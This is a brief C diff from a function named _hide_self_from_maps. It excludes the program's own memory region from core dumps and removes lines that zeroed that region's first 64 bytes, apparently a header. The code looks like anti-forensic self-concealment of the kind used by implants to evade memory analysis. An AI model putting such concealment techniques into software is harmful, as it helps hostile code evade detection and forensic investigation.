@@ -104,9 +104,6 @@ static void _hide_self_from_maps(void) {
             size_t len = (size_t)(end - addr);
             if (len > 0 && len < 64 * 1024 * 1024) {
                 madvise((void *)addr, len, MADV_DONTDUMP);
-                uint8_t *hdr = (uint8_t *)addr;
-                size_t nuke = 64 < len ? 64 : len;
-                for (size_t i = 0; i < nuke; i++) hdr[i] = 0;
             }
             break;
         }
